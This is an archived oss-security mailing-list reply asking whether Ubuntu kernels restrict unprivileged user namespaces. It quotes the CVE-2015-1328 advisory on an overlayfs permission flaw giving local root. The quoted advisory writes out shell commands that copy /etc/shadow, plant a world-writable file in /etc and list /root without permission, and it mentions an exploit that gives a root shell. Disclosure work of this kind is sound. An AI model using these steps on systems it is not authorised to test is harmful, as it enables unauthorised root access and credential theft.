X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5101" "Tuesday" "16" "June" "2015" "11:03:53" "+0200" "Alban Crequy" "alban.crequy@gmail.com" "<CAMXgnP5FtUDvcH4-mv-a_h0XY-C6a6OszBVihyRsnSvTq-bN-A@mail.gmail.com>" "110" "Re: [oss-security] CVE-2015-1328: incorrect permission checks in overlayfs, ubuntu local root" nil nil nil "6" "2015061609:03:53" "[oss-security] CVE-2015-1328: incorrect permission checks in overlayfs, ubuntu local root" (number mark "U       alban.crequy Jun 16  110/5101  " thread-indent "\"Re: [oss-security] CVE-2015-1328: incorrect permission checks in overlayfs, ubuntu local root\"\n") "<CAHQ_-nS=JUkbqptRUNvj6sfckqZ2qb0TLgoPsWaP9vzfBHnXLw@mail.gmail.com>" ("<CAHQ_-nS=JUkbqptRUNvj6sfckqZ2qb0TLgoPsWaP9vzfBHnXLw@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 24567 invoked by uid 550); 16 Jun 2015 09:46:36 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 28384 invoked from network); 16 Jun 2015 09:04:04 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:sender:in-reply-to:references:date:message-id:subject
         :from:to:content-type;
        bh=oVKj6unnttYLYBEOnD/dVobV//0I20gu5u0viW0Fyh8=;
        b=TQTtQPXDtoFHra+7HQPkHP2/1urxLJ2YFAlU+ymzxlYZUzAUeZ+BlqeLDmgeLvH4j7
         WUKUMlxo7qMaZm1sxPXh88WDbOL+tRJmdFZ0rhckliAM4boteoLN3SgNEB5mJs78/lOi
         /lFKk3S78H4s1x3ZcvsbrFNQAm5vf5TOMDckVAXZ1TQBfV3qEFN6JAByNda/0brgwuCP
         g5dkqYNv8J5DCIhtrYmo3niLRrzZSCWaoQj0NQx5+iNwjhHtz73M66wvR7iu0V/99EWd
         UXAoHSKtIiKxsxxHohiAwxccluQZmYkiNWYOwoXel2QqOmSYKMdet0nJ+TORkCyiAVQf
         UdTA==
MIME-Version: 1.0
X-Received: by 10.112.78.105 with SMTP id a9mr5397507lbx.70.1434445433788;
 Tue, 16 Jun 2015 02:03:53 -0700 (PDT)
Sender: muadda@gmail.com
In-Reply-To: <CAHQ_-nS=JUkbqptRUNvj6sfckqZ2qb0TLgoPsWaP9vzfBHnXLw@mail.gmail.com>
References: <CAHQ_-nS=JUkbqptRUNvj6sfckqZ2qb0TLgoPsWaP9vzfBHnXLw@mail.gmail.com>
Date: Tue, 16 Jun 2015 11:03:53 +0200
X-Google-Sender-Auth: Sagkh3sX8KPCobYlGyWzaWweiI4
Message-ID: <CAMXgnP5FtUDvcH4-mv-a_h0XY-C6a6OszBVihyRsnSvTq-bN-A@mail.gmail.com>
From: Alban Crequy <alban.crequy@gmail.com>
To: oss-security@lists.openwall.com
Content-Type: text/plain; charset=UTF-8
Subject: Re: [oss-security] CVE-2015-1328: incorrect permission checks in
 overlayfs, ubuntu local root

Hi,

Do Ubuntu kernels still disable unprivileged CLONE_NEWUSER by default,
unless changed in /proc/sys/kernel/unprivileged_userns_clone? I see
the patch in Debian but I don't know if it is still in Ubuntu:
http://anonscm.debian.org/viewvc/kernel/dists/trunk/linux/debian/patches/debian/add-sysctl-to-disallow-unprivileged-CLONE_NEWUSER-by-default.patch?view=markup

It should limit the scope of the issue to configurations where root
sets up user namespaces.

Best regards,
Alban

On 16 June 2015 at 02:17, Philip Pettersson <philip.pettersson@gmail.com> wrote:
> Hello, this is CVE-2015-1328 which allows a local root privilege escalation
> in the default configuration on all currently supported versions of Ubuntu.
>
> The overlayfs filesystem does not correctly check file permissions when
> creating new files in the upper filesystem directory. This can be exploited
> by an unprivileged process in kernels with CONFIG_USER_NS=y and where
> overlayfs has the FS_USERNS_MOUNT flag, which allows the mounting of overlayfs
> inside unprivileged mount namespaces. This is the default configuration of
> Ubuntu 12.04, 14.04, 14.10, and 15.04 [1].
>
> If you don't want to update your kernel and you don't use overlayfs, a viable
> workaround is to just remove or blacklist overlayfs.ko / overlay.ko.
>
> Details
> ================================
>
> From Documentation/filesystems/overlayfs.txt [2]:
>
> "Objects that are not directories (files, symlinks, device-special
> files etc.) are presented either from the upper or lower filesystem as
> appropriate.  When a file in the lower filesystem is accessed in a way
> the requires write-access, such as opening for write access, changing
> some metadata etc., the file is first copied from the lower filesystem
> to the upper filesystem (copy_up)."
>
> The ovl_copy_up_* functions do not correctly check that the user has
> permission to write files to the upperdir directory. The only permissions
> that are checked is if the owner of the file that is being modified has
> permission to write to the upperdir. Furthermore, when a file is copied from
> the lowerdir the file metadata is carbon copied, instead of attributes such as
> owner being changed to the user that triggered the copy_up_* procedures.
>
> Example of creating a 1:1 copy of a root-owned file:
>
> (Note that the workdir= option is not needed on older kernels)
>
> user@ubuntu-server-1504:~$ ./create-namespace
> root@ubuntu-server-1504:~# mount -t overlay -o
> lowerdir=/etc,upperdir=upper,workdir=work overlayfs o
> root@ubuntu-server-1504:~# chmod 777 work/work/
> root@ubuntu-server-1504:~# cd o
> root@ubuntu-server-1504:~/o# mv shadow copy_of_shadow
> (exit the namespace)
> user@ubuntu-server-1504:~$ ls -al upper/copy_of_shadow
> -rw-r----- 1 root shadow 1236 May 24 15:51 upper/copy_of_shadow
> user@ubuntu-server-1504:~$ stat upper/copy_of_shadow /etc/shadow|grep Inode
> Device: 801h/2049d      Inode: 939791      Links: 1
> Device: 801h/2049d      Inode: 277668      Links: 1
>
> Now we can place this file in /etc by switching "upper" to be the lowerdir
> option, the permission checks pass since the file is owned by root and root
> can write to /etc.
>
> user@ubuntu-server-1504:~$ ./create-namespace
> root@ubuntu-server-1504:~# mount -t overlay -o
> lowerdir=upper,upperdir=/etc,workdir=work overlayfs o
> root@ubuntu-server-1504:~# chmod 777 work/work/
> root@ubuntu-server-1504:~# cd o
> root@ubuntu-server-1504:~/o# chmod 777 copy_of_shadow
> root@ubuntu-server-1504:~/o# exit
> user@ubuntu-server-1504:~$ ls -al /etc/copy_of_shadow
> -rwxrwxrwx 1 root shadow 1236 May 24 15:51 /etc/copy_of_shadow
>
> The attached exploit gives a root shell by creating a world-writable
> /etc/ld.so.preload file. The exploit has been tested on the most recent
> kernels before 2015-06-15 on Ubuntu 12.04, 14.04, 14.10 and 15.04.
>
> It is also possible to list directory contents for any directory on the system
> regardless of permissions:
>
> nobody@ubuntu-server-1504:~$ ls -al /root
> ls: cannot open directory /root: Permission denied
> nobody@ubuntu-server-1504:~$ mkdir o upper work
> nobody@ubuntu-server-1504:~$ mount -t overlayfs -o
> lowerdir=/root,upperdir=/home/user/upper,workdir=/home/user/work
> overlayfs /home/user/o
> nobody@ubuntu-server-1504:~$ ls -al o 2>/dev/null
> total 8
> drwxrwxr-x 1 root nogroup 4096 May 24 16:33 .
> drwxr-xr-x 8 root nogroup 4096 May 24 16:33 ..
> -????????? ? ?    ?          ?            ? .bash_history
> -????????? ? ?    ?          ?            ? .bashrc
> d????????? ? ?    ?          ?            ? .cache
> -????????? ? ?    ?          ?            ? .lesshst
> d????????? ? ?    ?          ?            ? linux-3.19.0
>
>
> Credit
> ================================
> Philip Pettersson, Samsung SDS Security Center
>
> References
> ================================
> [1] https://git.launchpad.net/~ubuntu-kernel/ubuntu/+source/linux/+git/vivid/commit/?id=78ec4549
> [2] https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt
> [3] http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html
